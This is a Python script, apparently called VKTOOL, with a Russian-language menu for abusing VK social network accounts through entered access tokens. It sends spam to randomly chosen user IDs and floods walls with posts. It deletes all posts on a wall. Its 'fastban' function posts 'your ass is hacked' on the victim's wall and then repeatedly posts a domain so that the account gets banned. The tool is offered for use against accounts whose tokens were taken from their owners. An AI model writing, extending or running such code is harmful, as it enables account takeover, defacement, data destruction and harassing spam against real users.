import os
import time
import vk_api
import requests
from vk_api.utils import get_random_id
from random import randint
from colorama import Fore, Back, Style 
c = 'clear'
e = 'exit()'
intro = """

█             █
██           ██
█▒█         █▒█
█▄▄█▄▄▄▄▄▄▄█▄▄█
█▒▒▒▒▒▒▒▒▒▒▒▒▒█                                     
█▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  
█▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
█▒█▒▒▒█▒▒█▒▒█▒█▒▒▄▄▄▄▄▒▒▄▄▄▄▒▒▒▒▄▄▄▄▒▒▒█▒▒▒▒▒█ 
█▒█▒▒▒█▒▒█▒█▒▒█▒▒▒▒█▒▒▒█▒▒▒▒█▒▒█▒▒▒▒█▒▒█▒▒▒▒▒█  
█▒█▒▒▒█▒▒██▒▒▒█▒▒▒▒█▒▒▒█▒▒▒▒█▒▒█▒▒▒▒█▒▒█▒▒▒▒▒█ 
█▒▒█▒█▒▒▒█▒█▒▒█▒▒▒▒█▒▒▒█▒▒▒▒█▒▒█▒▒▒▒█▒▒█▒▒▒▒▒█
█▒▒▒█▒▒▒▒█▒█▒▒█▒▒▒▒█▒▒▒▒▀▀▀▀▒▒▒▒▀▀▀▀▒▒▒▀▀▀▀▀▒█
█▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
 ▀███████████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀  
                                  

"""
menu = """
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█|1| История VKTOOL                       █
█|2| Рассылка сообщений                   █
█|3| Бан страницы                         █
█|4| Заполнить стену                      █
█|5| Очистить стену                       █
█|6| Проверить токен на валидность        █
█|0| EXIT                                 █
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
"""
def wall_post():
    try:
        tok = input("[ACCESS-TOKEN] ► ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        numer = int(input('[Сколько постов создать?] ► '))
        mess = input('[Текст Постов] ► ')
        for i in range(numer):
            time.sleep(3)
            vk.wall.post(message=mess)
            print('[log] Пост успешно создан! Номер ' + str(i))
    except Exception as er:
        print('Неверный токен или неполучилось создать соединение!')
        main()
#Проверка токена на валидность 
def token_valid():
    try:
        tok = input("[ACCESS-TOKEN] ► ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='1')
        print('Валидный токен! Нажмите на Enter Что бы выйти в главное меню')
        input('[+] ► ')
        main()
    except Exception as er:
        print('Неверный токен! Нажмите на Enter что бы выйти в главвное меню')
        input('[+] ► ')
        main()
#В будующем 
def nakrutka():
    pass
#Удаление постов    
def delite_wall():
    try:
        tok = input("[ACCESS-TOKEN] ► ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()   

        posts = vk.wall.get(count=100)['items']
        while(posts):
            for post in posts:
                print('Успешно удаленно!')
                vk.wall.delete(post_id=post['id'])
            posts = vk.wall.get(count=100)['items']
    except Exception as er:
        print('Неверный токен или неполучилось создать соединение!')
        main()
def delite_message():
    pass
#Бан страницы
def fastban():
    try:
        tok = input("[ACCESS-TOKEN] ► ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='ТВоя жопа взломана!')
        for i in range(3):
            try:
                vk.wall.post(message='vto.pe')
                print('Запрос отправленн. Ожидайте бана!')
                time.sleep(3)
            except Exception as er:
                print('Аккаунт в бане!')
                main()
    except Exception as er:
        print('Неверный токен или неполучилось создать соединение!')
        main()
#Рассылка
def spam():
    tok = input("[ACCESS-TOKEN] ► ") 
    token = vk_api.VkApi(token = tok) 
    vk = token.get_api()
    num = int(input('[Сколько отправлять сообщений?] ► '))
    mes = input('[Ваше сообщение для рассылки] ► ')
    for a in range(num):
        try:
            ange = randint(666666, 99999999)
            vk.messages.send(user_id=ange, message=mes, random_id=get_random_id())
            time.sleep(25)
            print("Успешно отправленно!")
        except Exception as e:
            print('Стоят настройки приватности!')
#История            
def history():
    print("""


    """)
    num_menu1 = input("[+] ► ")
    if num_menu1 == "1":
        main()
#Меню
def main():
    os.system(c)
    print(intro)
    print(menu)
    num_menu = input("[+] ► ")
    if num_menu == "1":
        history()
    if num_menu == "2":
        spam()
    if num_menu == "3":
        fastban()
    if num_menu == "4":
        wall_post()
    if num_menu == "5":
        delite_wall()
    if num_menu == "6":
        token_valid()
    if num_menu == "0":
        os.system(e)       
main()
